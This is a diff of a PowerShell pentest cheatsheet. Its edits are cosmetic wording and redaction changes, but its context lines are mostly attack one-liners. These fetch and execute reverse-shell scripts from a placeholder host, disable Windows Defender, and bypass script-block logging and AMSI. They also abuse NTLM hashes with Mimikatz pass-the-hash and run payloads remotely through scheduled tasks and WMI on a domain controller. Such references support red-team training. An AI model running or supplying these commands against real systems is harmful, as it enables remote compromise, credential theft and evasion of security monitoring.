@@ -25,7 +25,7 @@ This cheatsheet will continue to receive updates.
 
 Please note that all of the following commands are run from a PowerShell prompt.
 
-Retrieve the PowerShell Version
+Retrieve the PowerShell version
 ```powershell
  $PSVersionTable 
  ```
@@ -59,7 +59,7 @@ List all cmdlets with PKI as source
 Get-Command -CommandType Cmdlet | ?{$_.Source -match "PKI"}
 ```
 
-List all commands in a module by running
+List available commands in a module by running
 ```powershell
 Get-Command -Module <module name>
 ```
@@ -67,7 +67,7 @@ Get-Command -Module <module name>
 ## Handy Tweaks
 ---
 
-When you launch PowerShell session, it opens in the user's home directory by default. This behavior can be modified so that new PS sessions open in your custom directory. Here is how:
+When you launch PowerShell session, it opens in the user's home directory by default. This behavior can be modified so that new PS sessions open in a custom directory. Here is how:
 
 ```powershell
 # Check the value of $PROFILE variable.
@@ -81,14 +81,14 @@ PS C:\Windows\system32> New-Item -Path $PROFILE -Type File -Force
 
 # To set and change the default working directory, open the above 'Microsoft.PowerShell_profile.ps1' in ISE and add the following line with your desired path.
 
-Set-location <Desired Path>
+Set-location <Custom directory path>
 ```
 
 
 ## One-Liners
 ---
 
-### Creating a firewall rule exception in Windows:
+### Creating a firewall rule exception in Windows
 ```powershell
 New-NetFirewallRule -DisplayName 'HTTP-Inbound' -Profile @('Domain', 'Private') -Direction Inbound -Action Allow -Protocol TCP -LocalPort @('80', '443')
 
@@ -109,22 +109,27 @@ iwr -UseBasicparsing http://192.168.X.X/Invoke-PowerShellRev.ps1 | iex
 ### Creating a Credential object
 ```powershell
 $SecPassword = ConvertTo-SecureString 'XXXXXXXXXXXX' -AsPlainText -Force
+
 $Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
+
 ```
 
 ### Decode Base64
 ```powershell
 $EncodedText = “VABoA....”
+
 $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
+
 $DecodedText
 ```
 
 ### Disable AV
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
+
 Set-MpPreference -DisableIOAVProtection $true
 ```
-### Encode Reverse Shell
+### Encode reverse shell
 ```powershell
 . .\Invoke-Encode.ps1
 
@@ -140,7 +145,7 @@ powershell -e <content of encodedcommand.txt>
 # Create reverse.bat file
 
 $Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://192.168.X.X/Invoke-PowerShellRev8080.ps1''))'
-Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\RTL\Tools\reverse8080.bat
+Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\...\Tools\reverse8080.bat
 
 # Call reverse.bat file
 
@@ -148,7 +153,7 @@ Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\RTL\Tools\reverse80
 .rotten.exe * reverse.bat
 
 ## Option 2
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:NTLMHASH /run:C:\users\appadmin\desktop\reverse.bat"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:<NTLMHASH> /run:C:\users\.....\desktop\reverse.bat"'
 ```
 
 ### Scheduled tasks
@@ -163,7 +168,7 @@ schtasks /Run /S dc.contoso.local /TN "UserX"
 Invoke-WmiMethod win32_process -ComputerName dc.contoso.local -name create -argumentlist "powershell.exe -e $encodedCommand"
 ```
 
-### Chain powershell commands to Bypass SBLogging, then AMSIBypass and then get reverse-shell
+### Chain powershell commands to Bypass SBLogging, then AMSIBypass and then get reverse shell
 ```powershell
 powershell -c "iex (iwr -UseBasicParsing http://192.168.X.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/Invoke-PowerShellTcpEx.ps1)
 ```
@@ -175,7 +180,7 @@ Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName (Get-Content ..\Outp
 
 ### Over pass-the-hash
 ```powershell
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:NTLMHASH /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:<NTLMHASH> /run:powershell.exe"'
 ```
 
 ## Playing with command output
